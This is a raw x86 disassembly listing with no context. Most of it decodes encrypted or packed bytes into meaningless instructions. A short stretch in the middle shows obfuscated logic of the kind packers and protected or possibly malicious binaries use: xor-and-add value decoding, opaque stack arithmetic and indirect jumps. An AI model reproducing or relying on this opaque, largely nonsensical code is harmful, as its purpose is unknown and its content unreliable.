  40f383:	ds or  eax,0xee0c51ad
  40f389:	lahf   
  40f38a:	pop    esi
  40f38b:	aas    
  40f38c:	inc    esp
  40f38d:	and    ebp,ecx
  40f38f:	mov    edx,0x51254f74
  40f394:	fistp  QWORD PTR [edi-0x65]
  40f397:	xor    eax,0x5234fd03
  40f39c:	ss or  al,0xb7
  40f39f:	cmp    ebx,DWORD PTR [ebx-0x70519ae3]
  40f3a5:	iret   
  40f3a6:	ins    DWORD PTR es:[edi],dx
  40f3a7:	cmp    al,0x3f
  40f3a9:	push   ds
  40f3aa:	push   esp
  40f3ab:	inc    esp
  40f3ac:	mul    esi
  40f3ae:	dec    esi
  40f3af:	cmp    eax,0x8d2e26e1
  40f3b4:	or     ecx,DWORD PTR [ebp+edx*2+0x7]
  40f3b8:	das    
  40f3b9:	jno    0x40f3e9
  40f3bb:	dec    edx
  40f3bc:	inc    edx
  40f3bd:	or     al,0x89
  40f3bf:	fild   QWORD PTR [eax+0x3a3a47af]
  40f3c5:	nop
  40f3c6:	mov    fs,WORD PTR [ebx-0x30ba812]
  40f3cc:	test   BYTE PTR [edx],bl
  40f3ce:	add    al,0xc3
  40f3d0:	test   eax,0xcf7f1ce
  40f3d5:	mov    bl,0x4c
  40f3d7:	in     al,dx
  40f3d8:	daa    
  40f3d9:	(bad)  
  40f3da:	out    0xc4,al
  40f3dc:	push   esp
  40f3dd:	sbb    DWORD PTR [ebp+0x7c],ebp
  40f3e0:	ror    ah,cl
  40f3e2:	or     eax,0x4fe24533
  40f3e7:	mov    edx,0x75ff519f
  40f3ec:	push   eax
  40f3ed:	sub    ecx,eax
  40f3ef:	and    al,0xfc
  40f3f1:	test   DWORD PTR [eax+0xd],esi
  40f3f4:	add    ebx,DWORD PTR [eax]
  40f3f6:	cmp    al,dh
  40f3f8:	mov    eax,ds:0xc5f95e75
  40f3fd:	inc    esp
  40f3fe:	jecxz  0x40f3d9
  40f400:	sbb    eax,0x7f69bc6e
  40f405:	sbb    al,0xcc
  40f407:	xchg   esp,eax
  40f408:	dec    ebp
  40f409:	call   0x13e38d0f
  40f40e:	lea    ebx,[esi]
  40f410:	(bad)  
  40f411:	push   esi
  40f412:	mov    al,ds:0x397a0d6
  40f417:	and    DWORD PTR [edi+ebx*2],edx
  40f41a:	ds aaa 
  40f41c:	hlt    
  40f41d:	push   ds
  40f41e:	mov    dh,0x42
  40f420:	dec    esi
  40f421:	stc    
  40f422:	test   DWORD PTR [ecx],edx
  40f424:	in     al,dx
  40f425:	mov    al,0x71
  40f427:	arpl   WORD PTR ds:[edx+0x2c5c06ff],dx
  40f42e:	clc    
  40f42f:	push   eax
  40f430:	push   ss
  40f431:	mov    ds:0x13d97ffa,eax
  40f436:	jns    0x40f414
  40f438:	sahf   
  40f439:	sub    ch,dh
  40f43b:	mov    ah,ch
  40f43d:	stos   BYTE PTR es:[edi],al
  40f43e:	lea    esi,[edx+0x78]
  40f441:	push   ebx
  40f442:	into   
  40f443:	pop    ss
  40f444:	pushf  
  40f445:	mov    al,0x77
  40f447:	mov    dh,cl
  40f449:	mov    WORD PTR [edi-0x152f87c9],gs
  40f44f:	push   ds
  40f450:	inc    edi
  40f451:	push   ss
  40f452:	mov    BYTE PTR ds:0x229bc2c9,0xab
  40f459:	ins    DWORD PTR es:[edi],dx
  40f45a:	sub    edi,DWORD PTR [ebp-0x78b53ee5]
  40f460:	xchg   edx,eax
  40f461:	ins    DWORD PTR es:[edi],dx
  40f462:	push   eax
  40f463:	cld    
  40f464:	sti    
  40f465:	pop    ecx
  40f466:	sbb    DWORD PTR [ecx-0x77],esp
  40f469:	loopne 0x40f3f8
  40f46b:	pop    ds
  40f46c:	retf   0x33d8
  40f46f:	hlt    
  40f470:	int3   
  40f471:	jne    0x40f480
  40f473:	fsub   st(7),st
  40f475:	into   
  40f476:	jecxz  0x40f3fc
  40f478:	int    0xab
  40f47a:	push   edi
  40f47b:	fild   WORD PTR [edi]
  40f47d:	pushf  
  40f47e:	inc    ecx
  40f47f:	push   0x4fdc7bda
  40f484:	out    0x3,al
  40f486:	fxch   st(6)
  40f488:	or     al,0xee
  40f48a:	test   BYTE PTR [ecx],ah
  40f48c:	nop
  40f48d:	add    al,0x24
  40f48f:	jmp    0x40f4f6
  40f491:	in     al,dx
  40f492:	inc    edi
  40f493:	xchg   esp,eax
  40f494:	sub    DWORD PTR [edi-0x22],edi
  40f497:	fucomip st,st(0)
  40f499:	fsubr  QWORD PTR [eax-0x50]
  40f49c:	test   eax,0xa5edca05
  40f4a1:	enter  0x7b08,0x1d
  40f4a5:	inc    DWORD PTR [edx+0x265d985e]
  40f4ab:	push   ebx
  40f4ac:	idiv   DWORD PTR [esi-0x47889676]
  40f4b2:	and    ah,ch
  40f4b4:	mov    eax,0x452805c9
  40f4b9:	test   eax,0x4b7ac035
  40f4be:	test   BYTE PTR [eax],ah
  40f4c0:	and    ah,dh
  40f4c2:	ss mov esi,0x55800290
  40f4c8:	fwait
  40f4c9:	sub    eax,0x41bc3d84
  40f4ce:	cdq    
  40f4cf:	or     dh,BYTE PTR [ebx+esi*4+0x446fd5ad]
  40f4d6:	dec    esp
  40f4d7:	push   ds
  40f4d8:	inc    esi
  40f4d9:	mov    edi,0xd7f2cabd
  40f4de:	push   edx
  40f4df:	mov    bh,0x9e
  40f4e1:	or     BYTE PTR [eax],ah
  40f4e3:	push   esp
  40f4e4:	ds pop ds
  40f4e6:	int3   
  40f4e7:	and    edx,DWORD PTR [ecx]
  40f4e9:	inc    ebx
  40f4ea:	inc    eax
  40f4eb:	hlt    
  40f4ec:	pop    ebp
  40f4ed:	sbb    ebx,DWORD PTR [esi]
  40f4ef:	sbb    ch,cl
  40f4f1:	jns    0x40f53f
  40f4f3:	ficomp WORD PTR [edi]
  40f4f5:	scas   al,BYTE PTR es:[edi]
  40f4f6:	jp     0x40f51f
  40f4f8:	mov    al,0xdd
  40f4fa:	repz or edx,edx
  40f4fd:	inc    eax
  40f4fe:	mov    eax,edi
  40f500:	(bad)  
  40f501:	in     al,0xf9
  40f503:	cmp    ebx,esp
  40f505:	xchg   esi,eax
  40f506:	aad    0x9a
  40f508:	mov    eax,0x42554d68
  40f50d:	sahf   
  40f50e:	jns    0x40f52c
  40f510:	and    DWORD PTR [esp+eax*2-0x5b],0x89301228
  40f518:	and    bl,BYTE PTR [esi-0x3e]
  40f51b:	jb     0x40f57f
  40f51d:	scas   eax,DWORD PTR es:[edi]
  40f51e:	dec    ecx
  40f51f:	std    
  40f520:	jne    0x40f4e1
  40f522:	cmovae eax,DWORD PTR [edi-0x65e240c9]
  40f529:	nop
  40f52a:	aaa    
  40f52b:	(bad)  
  40f52d:	pushf  
  40f52e:	jecxz  0x40f56c
  40f530:	ret    0xcaeb
  40f533:	add    al,0x1f
  40f535:	rcl    DWORD PTR [esp+edi*2],cl
  40f538:	ficomp WORD PTR [edi+ebx*2+0x63fe4326]
  40f53f:	fwait
  40f540:	mov    cl,BYTE PTR [ecx+edi*1-0x31]
  40f544:	(bad)  
  40f545:	cmp    al,0x66
  40f547:	push   ebp
  40f548:	jp     0x40f567
  40f54a:	enter  0x1233,0xc1
  40f54e:	shr    DWORD PTR [eax-0x56],cl
  40f551:	inc    esi
  40f552:	in     eax,0x9e
  40f554:	or     BYTE PTR [eax+0x23cca6cb],0x3b
  40f55b:	jmp    0xe743adb0
  40f560:	xchg   esp,eax
  40f561:	orps   xmm1,XMMWORD PTR [ecx-0x48e71a39]
  40f568:	(bad)  
  40f569:	mov    bh,0x4a
  40f56b:	mov    DWORD PTR [esi],edi
  40f56d:	xor    eax,ebp
  40f56f:	aam    0xf9
  40f571:	jno    0x40f5aa
  40f573:	push   ebx
  40f574:	inc    ebx
  40f575:	sub    cl,0x33
  40f578:	sbb    al,0x91
  40f57a:	inc    esp
  40f57b:	rcr    bh,1
  40f57d:	jo     0x40f514
  40f57f:	pop    ecx
  40f580:	adc    DWORD PTR [edx+eiz*2-0x7a86c91c],0xffffffca
  40f588:	xor    dh,cl
  40f58a:	test   DWORD PTR [edx-0x5a78ee70],ecx
  40f590:	xchg   esp,eax
  40f591:	fldenv [ebx]
  40f593:	add    esi,ecx
  40f595:	jle    0x40f59d
  40f597:	jo     0x40f58a
  40f599:	add    DWORD PTR ds:0x1f3012e7,0x21a2f6ef
  40f5a3:	sub    al,0x60
  40f5a5:	out    0x1,al
  40f5a7:	mov    ah,0xc0
  40f5a9:	xchg   ebp,eax
  40f5aa:	sahf   
  40f5ab:	stos   DWORD PTR es:[edi],eax
  40f5ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5ad:	loop   0x40f5f9
  40f5af:	js     0x40f5d2
  40f5b1:	sub    dh,BYTE PTR ds:0x458bc83b
  40f5b7:	cld    
  40f5b8:	je     0x40f617
  40f5be:	mov    ecx,DWORD PTR [ebp-0x30]
  40f5c1:	xor    eax,esi
  40f5c3:	add    eax,edi
  40f5c5:	cmp    ecx,eax
  40f5c7:	je     0x40f620
  40f5cd:	lea    eax,[ebp-0x8]
  40f5d0:	push   eax
  40f5d1:	push   DWORD PTR [ebp-0x28]
  40f5d4:	push   DWORD PTR [ebp+0xc]
  40f5d7:	call   0x411bb3
  40f5dc:	mov    eax,DWORD PTR [ebp-0x4]
  40f5df:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5e2:	xor    eax,esi
  40f5e4:	add    eax,edi
  40f5e6:	cmp    ecx,eax
  40f5e8:	je     0x40f603
  40f5ee:	mov    eax,DWORD PTR [ebp-0x34]
  40f5f1:	movzx  eax,WORD PTR [eax+ebx*2]
  40f5f5:	mov    ecx,DWORD PTR [ebp-0x14]
  40f5f8:	mov    eax,DWORD PTR [ecx+eax*4]
  40f5fb:	mov    DWORD PTR [ebp-0x38],eax
  40f5fe:	jmp    0x40d1fa
  40f603:	mov    eax,DWORD PTR [ebp-0xc]
  40f606:	xor    eax,esi
  40f608:	lea    ebx,[ebx+eax*1+0x3272f6]
  40f60f:	jmp    0x40cf5b
  40f614:	mov    eax,DWORD PTR [ebp-0x4]
  40f617:	xor    eax,esi
  40f619:	add    eax,edi
  40f61b:	jmp    0x411aee
  40f620:	mov    eax,DWORD PTR [ebp-0x38]
  40f623:	add    eax,DWORD PTR [ebp+0x8]
  40f626:	mov    DWORD PTR [ebp-0x18],eax
  40f629:	mov    eax,DWORD PTR [ebp-0x1c]
  40f62c:	test   eax,eax
  40f62e:	je     0x411a77
  40f634:	mov    DWORD PTR [ebp-0x20],0x0
  40f63b:	push   0x3
  40f63d:	xor    edx,edx
  40f63f:	pop    edx
  40f640:	add    edx,0x8
  40f643:	push   edx
  40f644:	pop    ecx
  40f645:	push   0x6
  40f647:	dec    ecx
  40f648:	pop    ebx
  40f649:	dec    ebx
  40f64a:	xchg   ebx,ecx
  40f64c:	sub    ebx,ecx
  40f64e:	xchg   ebx,ecx
  40f650:	dec    ecx
  40f651:	mov    eax,DWORD PTR [ebp-0x1c]
  40f654:	imul   eax,ecx
  40f657:	sub    esp,eax
  40f659:	mov    DWORD PTR [ebp-0x20],esp
  40f65c:	mov    eax,DWORD PTR [ebp-0x4]
  40f65f:	xor    eax,esi
  40f661:	add    eax,edi
  40f663:	jmp    0x411a50
  40f668:	mov    ecx,DWORD PTR [ebp-0xc]
  40f66b:	mov    eax,DWORD PTR [ebp+0x8]
  40f66e:	mov    edx,DWORD PTR [ebp+0x14]
  40f671:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40f675:	jmp    0x411a24
  40f67a:	push   edi
  40f67b:	into   
  40f67c:	cmc    
  40f67d:	pop    ss
  40f67e:	in     al,0x4
  40f680:	xchg   ebp,eax
  40f681:	mov    ?,WORD PTR [edi+0xb5c25fb]
  40f687:	aad    0xeb
  40f689:	cdq    
  40f68a:	ret    
  40f68b:	scas   eax,DWORD PTR es:[edi]
  40f68c:	add    DWORD PTR [ebx-0x7c7c9f0f],0xffffffa7
  40f693:	jo     0x40f6e4
  40f695:	xor    eax,0xeee4c68a
  40f69a:	call   0x5b32948f
  40f69f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6a0:	mov    al,ds:0x5c283380
  40f6a5:	imul   esp,DWORD PTR [ecx+0x52],0x52337b17
  40f6ac:	sub    eax,0x3d9eeece
  40f6b1:	or     BYTE PTR [esi+0x5e],ch
  40f6b4:	mov    eax,ds:0x2c02ff9f
  40f6b9:	jecxz  0x40f70b
  40f6bb:	ss inc esp
  40f6bd:	cmp    cl,BYTE PTR ds:0x8728350d
  40f6c3:	mov    eax,ds:0x4b8cc984
  40f6c8:	dec    ecx
  40f6c9:	ret    0xdb80
  40f6cc:	data16 sub cl,BYTE PTR [ecx]
  40f6cf:	ja     0x40f696
  40f6d1:	mov    al,ds:0xdceb3e64
  40f6d6:	jge    0x40f6e4
  40f6d8:	mov    esi,0x8b3734dd
  40f6dd:	add    BYTE PTR [ecx-0x5f224092],bh
  40f6e3:	rcl    BYTE PTR ds:0x85df88ce,cl
  40f6e9:	fdivr  QWORD PTR [ebx+0x70]
  40f6ec:	xor    al,BYTE PTR [ecx-0x50]
  40f6ef:	out    0x8a,eax
  40f6f1:	adc    dh,BYTE PTR [edi]
  40f6f3:	sbb    esi,DWORD PTR [edi-0x6eb0ef3f]
  40f6f9:	push   edx
  40f6fa:	push   edi
  40f6fb:	add    al,0xa1
  40f6fd:	xor    al,0x30
  40f6ff:	jmp    0x6a26:0xe7390e27
  40f706:	std    
  40f707:	xchg   edx,eax
  40f708:	inc    ebx
  40f709:	fild   QWORD PTR [edi]
  40f70b:	inc    edx
  40f70c:	sub    DWORD PTR [esi*1+0x11df2737],0x7d
  40f714:	icebp  
  40f715:	je     0x40f74d
  40f717:	in     al,dx
  40f718:	mov    al,ds:0xf4f21820
  40f71d:	jno    0x40f75d
  40f71f:	and    DWORD PTR [eax-0x516583e2],edx
  40f725:	test   ebx,esp
  40f727:	leave  
  40f728:	int3   
  40f729:	add    DWORD PTR [esi+ebp*2+0x16],esp
  40f72d:	mov    ds:0x1446027d,al
  40f732:	retf   
  40f733:	xchg   ebx,eax
  40f734:	jl     0x40f7ac
  40f736:	pop    esp
  40f737:	adc    ch,BYTE PTR [ebp+esi*2+0x28]
  40f73b:	mov    al,BYTE PTR [ecx+esi*2+0x448e8803]
  40f742:	aam    0xec
  40f744:	pop    edi
  40f745:	mov    BYTE PTR [ebp-0x733a484f],0x4f
  40f74c:	and    BYTE PTR [ecx+0x34],bl
  40f74f:	jge    0x40f71f
  40f751:	mov    edi,0xd16a295f
  40f756:	ins    BYTE PTR es:[edi],dx
  40f757:	out    dx,eax
  40f758:	rcl    BYTE PTR [ecx+0x626faed7],0xae
  40f75f:	fcomp  QWORD PTR [esi+0x203175fc]
  40f765:	pop    ss
  40f766:	fbstp  TBYTE PTR [esi+ebx*8+0x32]
  40f76a:	arpl   WORD PTR [ebp+0x49],si
  40f76d:	out    dx,eax
  40f76e:	out    0x1d,eax
  40f770:	fisubr WORD PTR [ecx+0x54]
  40f773:	cmp    al,0x4a
  40f775:	ror    DWORD PTR [esi],1
  40f777:	push   ecx
  40f778:	ja     0x40f7ae
  40f77a:	clc    
  40f77b:	mov    al,ds:0xbf12ca27
  40f780:	and    bh,BYTE PTR [ecx-0x4f]
  40f783:	cwde   
  40f784:	lods   al,BYTE PTR ds:[esi]
  40f785:	push   ss
  40f786:	and    DWORD PTR [edx],0xffffff9e
  40f789:	imul   edx,DWORD PTR [eax],0xdf0c689a
  40f78f:	lea    esi,[eax]
  40f791:	sub    cl,BYTE PTR [edi+0xb]
  40f794:	aad    0xa5
  40f796:	adc    ecx,DWORD PTR [eax-0x6b]
  40f799:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f79a:	adc    DWORD PTR [esi],0xffffffda
  40f79d:	or     DWORD PTR [esp+ecx*1+0x2a02910f],eax
  40f7a4:	push   eax
  40f7a5:	or     eax,0xc0dfe712
  40f7aa:	adc    eax,0xa6398870
  40f7af:	std    
  40f7b0:	fistp  DWORD PTR [eax+eiz*2-0x3d6bae89]
  40f7b7:	cwde   
  40f7b8:	cs leave 
  40f7ba:	daa    
  40f7bb:	nop
  40f7bc:	cmp    dl,BYTE PTR [eax-0x659df6df]
  40f7c2:	sub    ebx,edx
  40f7c4:	das    
  40f7c5:	aam    0x3f
  40f7c7:	dec    esi
  40f7c8:	cmp    ecx,esi
  40f7ca:	mov    edi,0x977940c5
  40f7cf:	outs   dx,DWORD PTR ds:[esi]
  40f7d0:	out    dx,eax
  40f7d1:	mov    BYTE PTR [ebp-0xb35e78f],cl
  40f7d7:	je     0x40f78b
  40f7d9:	sahf   
  40f7da:	call   0xe1b2:0x776bea81
  40f7e1:	or     edx,DWORD PTR [edi]
  40f7e3:	xchg   ecx,eax
  40f7e4:	fst    QWORD PTR [edx+0x2ab38db2]
  40f7ea:	fsubr  DWORD PTR [esi+0x54f41739]
  40f7f0:	push   ds
  40f7f1:	push   es
  40f7f2:	dec    edx
  40f7f3:	test   DWORD PTR [edi-0x5d],eax
  40f7f6:	aas    
  40f7f7:	pop    ebp
  40f7f8:	pop    ecx
  40f7f9:	in     al,dx
  40f7fa:	test   BYTE PTR [edx+0x729e7332],dh
  40f800:	loop   0x40f78e
  40f802:	clc    
  40f803:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f804:	xchg   ch,al
  40f806:	add    BYTE PTR ds:[ebx-0x1fecb62],ah
  40f80d:	lods   eax,DWORD PTR ds:[esi]
  40f80e:	pop    esi
  40f80f:	or     al,0xa2
  40f811:	push   ebp
  40f812:	dec    ebp
  40f813:	rcr    ebx,cl
  40f815:	fdivr  st,st(3)
  40f817:	xor    al,0xa2
  40f819:	arpl   WORD PTR [ebx-0x7f],bp
  40f81c:	lahf   
  40f81d:	ds daa 
  40f81f:	pop    esp
  40f820:	sub    DWORD PTR fs:[edi],esp
  40f823:	js     0x40f899
  40f825:	xchg   ebp,eax
  40f826:	mov    ecx,0xaf3eb1b0
  40f82b:	sbb    ecx,DWORD PTR [edi]
  40f82d:	nop
  40f82e:	hlt    
  40f82f:	inc    edi
  40f830:	push   0x44
  40f832:	sbb    ch,BYTE PTR [esi]
  40f834:	pop    ebx
  40f835:	das    
  40f836:	(bad)  
  40f837:	sbb    edi,DWORD PTR [edx-0x2b3e31ea]
  40f83d:	xchg   ebx,ebp
  40f83f:	jb     0x40f84b
  40f841:	sub    eax,0x30a01dd6
  40f846:	in     eax,dx
  40f847:	call   0x5d371ae4
  40f84c:	dec    eax
  40f84d:	stos   DWORD PTR es:[edi],eax
  40f84e:	ja     0x40f891
  40f850:	mov    fs,WORD PTR [eax-0x817b8c5]
  40f856:	pop    ds
  40f857:	ds mov esi,0x7d25f6b9
  40f85d:	xchg   esp,eax
  40f85e:	xchg   ch,dh
  40f860:	neg    dh
  40f862:	inc    edx
  40f863:	dec    ecx
  40f864:	xchg   esp,eax
  40f865:	push   esi
  40f866:	addr16 dec ebx
  40f868:	sub    eax,0x464c5d2b
  40f86d:	(bad)  
  40f86f:	inc    ecx
  40f870:	in     eax,dx
  40f871:	and    ebx,0x2642239c
  40f877:	push   ebx
  40f878:	in     eax,dx
  40f879:	mov    ebp,0x1da42e3e
  40f87e:	dec    eax
  40f87f:	jmp    0x73b70cd0
  40f884:	jb     0x40f87b
  40f886:	push   cs
  40f887:	lock jecxz 0x40f861
  40f88a:	mov    ch,0x79
  40f88c:	out    0x3e,eax
  40f88e:	lahf   
  40f88f:	scas   eax,DWORD PTR es:[edi]
  40f890:	add    DWORD PTR ds:[eax-0x7ddf9d0],0xfffffffc
  40f898:	mov    ebx,0x6f56ec4a
  40f89d:	stos   DWORD PTR es:[edi],eax
  40f89e:	sub    esi,DWORD PTR ds:0xef4079d2
  40f8a4:	imul   edi,DWORD PTR [ecx-0x2b483117],0x1d
  40f8ab:	ins    DWORD PTR es:[edi],dx
  40f8ac:	push   esp
  40f8ad:	push   eax
  40f8ae:	js     0x40f8a5
  40f8b0:	retf   
  40f8b1:	sbb    BYTE PTR [ebx+0x54],dl
  40f8b4:	imul   ebp
  40f8b6:	out    0x4f,al
  40f8b8:	jno    0x40f8de
  40f8ba:	mov    ch,0xc
  40f8bc:	iret   
  40f8bd:	jns    0x40f856
  40f8bf:	mov    bl,0x41
  40f8c1:	daa    
  40f8c2:	ins    BYTE PTR es:[edi],dx
  40f8c3:	lods   al,BYTE PTR ds:[esi]
  40f8c4:	pop    ebx
  40f8c5:	or     al,0xe4
  40f8c7:	sahf   
  40f8c8:	out    dx,al
  40f8c9:	xor    dl,0x45
  40f8cc:	sbb    eax,0xdf621a6c
  40f8d1:	rol    DWORD PTR [eax-0x2d3924e3],1
  40f8d7:	fadd   DWORD PTR [eax-0x669f7329]
  40f8dd:	push   edx
  40f8de:	(bad)  
  40f8df:	adc    BYTE PTR [ecx],bl
  40f8e1:	nop
  40f8e2:	jbe    0x40f89c
  40f8e4:	mov    esp,0xbf438cc0
  40f8e9:	jmp    0x40f8b3
  40f8eb:	and    al,0x6a
  40f8ed:	mov    eax,0xdbc671c4
  40f8f2:	xchg   ebp,eax
  40f8f3:	add    BYTE PTR [edi-0x1ff120da],0x44
  40f8fa:	xchg   ebx,eax
  40f8fb:	sub    eax,0xd5ec933c
  40f900:	adc    eax,0xc80a488d
  40f905:	ss nop
  40f907:	pop    ss
  40f908:	add    BYTE PTR [ecx],0x4
  40f90b:	aas    
  40f90c:	xlat   BYTE PTR ds:[ebx]
  40f90d:	lods   al,BYTE PTR ds:[esi]
  40f90e:	add    al,0x8
  40f910:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f911:	into   
  40f912:	aas    
  40f913:	adc    al,0x65
  40f915:	jne    0x40f8d7
  40f917:	mov    ebx,0xfa2f0db2
  40f91c:	lods   al,BYTE PTR ds:[esi]
  40f91d:	xor    eax,0xc950f67
  40f922:	gs jmp 0xe2e99c97
  40f928:	mov    eax,ds:0x4d97b1e5
  40f92d:	add    DWORD PTR [esi+0x63],esi
  40f930:	add    ecx,0xffffff9b
  40f933:	add    al,0xc9
  40f935:	dec    esi
  40f936:	xchg   esp,eax
  40f937:	xchg   edi,eax
  40f938:	adc    eax,DWORD PTR [edx]
  40f93a:	inc    ecx
  40f93b:	push   0x5a72b21
  40f940:	mov    dh,0x93
  40f942:	out    0xbe,al
  40f944:	xor    dl,BYTE PTR [edx-0x3ffc6c5f]
  40f94a:	or     ecx,DWORD PTR [edi]
  40f94c:	sti    
  40f94d:	push   eax
  40f94e:	mov    dh,0x80
  40f950:	cmp    al,0x16
  40f952:	push   ebx
  40f953:	ficomp WORD PTR [ebx+0x3a]
  40f956:	clc    
  40f957:	add    eax,0x4a6de645
  40f95c:	push   0x5ead1761
  40f961:	xchg   esi,eax
  40f962:	dec    ebp
  40f963:	and    BYTE PTR [esi],0x77
  40f966:	push   edx
  40f967:	or     al,0xe6
  40f969:	ss lahf 
  40f96b:	stc    
  40f96c:	lahf   
  40f96d:	xchg   ebx,eax
  40f96e:	scas   al,BYTE PTR es:[edi]
  40f96f:	mov    esi,0x486d1ba8
  40f974:	fadd   QWORD PTR [esi]
  40f976:	(bad)  
  40f977:	pop    eax
  40f978:	icebp  
  40f979:	les    esp,FWORD PTR [edi+edx*8]
  40f97c:	cmp    dl,BYTE PTR [edx+0x34f0f32b]
  40f982:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f983:	mov    ds:0xd076ffe6,eax
  40f988:	je     0x40f90d
  40f98a:	addr16 jno 0x40f99d
  40f98d:	xor    dh,BYTE PTR [ebx]
  40f98f:	jbe    0x40f9d2
  40f991:	jg     0x40f9df
  40f993:	dec    esi
  40f994:	into   
  40f995:	out    dx,al
  40f996:	cmp    DWORD PTR [edx+0x74],eax
  40f999:	sbb    eax,0xce3b09f8
  40f99e:	sbb    al,0xf8
  40f9a0:	cmp    BYTE PTR [edi-0xc863b2e],ch
  40f9a6:	clc    
  40f9a7:	dec    esp
  40f9a8:	pop    ss
  40f9a9:	adc    BYTE PTR [ecx],bh
  40f9ab:	mov    ch,0xe9
  40f9ad:	sbb    esi,0xffffffb8
  40f9b0:	outs   dx,BYTE PTR ds:[esi]
  40f9b1:	xchg   edi,eax
  40f9b2:	mov    ds:0x33012edb,eax
  40f9b7:	les    esi,FWORD PTR [edx-0x6c]
  40f9ba:	mov    eax,0x4c58e885
  40f9bf:	pop    edi
  40f9c0:	pusha  
  40f9c1:	iret   
  40f9c2:	adc    eax,0x5a7fe344
  40f9c7:	aas    
  40f9c8:	iret   
  40f9c9:	xchg   esi,eax
  40f9ca:	sub    BYTE PTR [edx-0x11f9cbf9],al
  40f9d0:	pushf  
  40f9d1:	fbld   TBYTE PTR [ebp+0x74]
  40f9d4:	clc    
  40f9d5:	inc    edi
  40f9d6:	cmp    bl,BYTE PTR [edi-0x613fd99e]
  40f9dc:	xchg   ebx,ebx
  40f9de:	out    dx,al
  40f9df:	nop
  40f9e0:	push   es
  40f9e1:	arpl   WORD PTR [ebp+0x7ecc8ae7],dx
  40f9e7:	and    eax,0x8a3d1f31
  40f9ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9ed:	jno    0x40fa50
  40f9ef:	mov    edx,0x278a7502
  40f9f4:	inc    edi
  40f9f5:	jp     0x40fa40
  40f9f7:	mov    al,0xcc
  40f9f9:	sub    edi,DWORD PTR [eax+0xbb5917d]
  40f9ff:	retf   0x7a4a
  40fa02:	and    eax,0x1c2e4206
  40fa07:	xor    DWORD PTR [esi+0x6bc99968],ecx
  40fa0d:	inc    edx
  40fa0e:	inc    ebp
  40fa0f:	xchg   ebp,eax
  40fa10:	ja     0x40fa79
  40fa12:	in     eax,dx
  40fa13:	call   0xa06a:0x8fdd2887
  40fa1a:	enter  0xd34a,0x33
  40fa1e:	jbe    0x40f9f1
  40fa20:	data16 data16 and al,0xc5
  40fa24:	jmp    0xcdc9:0xce04f60d
  40fa2b:	push   eax
  40fa2c:	scas   eax,DWORD PTR es:[edi]
  40fa2d:	sub    eax,0x51f7a125
  40fa32:	mov    ecx,db4
  40fa35:	push   DWORD PTR ds:0xcd2d45cc
  40fa3b:	outs   dx,DWORD PTR ds:[esi]
  40fa3c:	pop    es
  40fa3d:	mov    ecx,0xda860dd
  40fa42:	fcomi  st,st(4)
  40fa44:	cmp    BYTE PTR [ebp-0x4c],ah
  40fa47:	mov    dh,0x9c
  40fa49:	in     al,dx
  40fa4a:	mov    ?,WORD PTR [ebx+0xe]
  40fa4d:	(bad)  
  40fa4e:	pop    edi
  40fa4f:	cld    
  40fa50:	cmc    
  40fa51:	inc    edx
  40fa52:	retf   
  40fa53:	repz enter 0x950f,0xda
  40fa58:	jno    0x40f9fb
  40fa5a:	dec    esp
  40fa5b:	rcl    DWORD PTR [edi],cl
  40fa5d:	sbb    BYTE PTR [edx+0x13],dl
  40fa60:	cmp    BYTE PTR [eax+0x16d0d35f],dl
  40fa66:	dec    ebp
  40fa67:	xor    eax,0x295f8133
  40fa6c:	out    dx,al
  40fa6d:	test   eax,0x346ac90f
  40fa72:	jbe    0x40fa51
  40fa74:	pusha  
  40fa75:	arpl   WORD PTR [edi-0xc],bx
  40fa78:	inc    ebp
  40fa79:	call   0xdba29bf1
  40fa7e:	dec    ecx
  40fa7f:	or     eax,0x43938e47
  40fa84:	xchg   ebx,eax
  40fa85:	les    esi,FWORD PTR [ebp+0x60]
  40fa88:	pop    ebp
  40fa89:	xchg   ebp,eax
  40fa8a:	daa    
  40fa8b:	test   BYTE PTR [edi+0x78af1853],dh
  40fa91:	fwait
  40fa92:	out    dx,eax
  40fa93:	mov    ah,0xd1
  40fa95:	sub    eax,0x23ce83e8
  40fa9a:	push   ebp
  40fa9b:	retf   
  40fa9c:	xor    esp,edx
  40fa9e:	pusha  
  40fa9f:	adc    eax,0xb3c74f55
  40faa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40faa5:	(bad)  
  40faa6:	xor    esp,edi
  40faa8:	add    eax,0x9efa8594
  40faad:	jl     0x40fa96
  40faaf:	int3   
  40fab0:	fs popa 
  40fab2:	push   ds
  40fab3:	cld    
  40fab4:	mov    bh,0xf2
  40fab6:	mov    esp,DWORD PTR [ebp+0x220665c9]
  40fabc:	mov    DWORD PTR [esi],edx
  40fabe:	jae    0x40fa63
  40fac0:	pop    esi
  40fac1:	and    BYTE PTR [ebp+0x15],al
  40fac4:	xor    eax,0x4202fb51
  40fac9:	call   0x3beec85b
  40face:	add    eax,0x2c41178a
  40fad3:	jbe    0x40fa55
  40fad5:	add    BYTE PTR [eax*4-0x206b2971],0x80
  40fadd:	addr16 and edx,esp
  40fae0:	fnstsw WORD PTR [edi+0x3b5ef74c]
  40fae6:	fmul   QWORD PTR [ebx-0x14453a73]
  40faec:	imul   BYTE PTR [edi]
  40faee:	mov    esp,0x3631c162
  40faf3:	cli    
  40faf4:	inc    esp
  40faf5:	(bad)  
  40faf6:	rcr    DWORD PTR [ecx+0x48010e84],1
  40fafc:	in     al,0x3b
  40fafe:	pushf  
  40faff:	lds    ebp,FWORD PTR [esi]
  40fb01:	push   ebx
  40fb02:	pushf  
  40fb03:	jb     0x40fb5b
  40fb05:	in     al,0x13
  40fb07:	loope  0x40fb67
  40fb09:	cmp    eax,0xffffffdc
  40fb0c:	je     0x40faee
  40fb0e:	mov    ds:0x275c44d4,eax
  40fb13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb14:	test   bh,al
  40fb16:	sbb    eax,0x125c6b31
  40fb1b:	sbb    al,bh
  40fb1d:	jns    0x40fb23
  40fb1f:	adc    esi,DWORD PTR [ebx-0x66e6bdb9]
  40fb25:	jle    0x40fb57
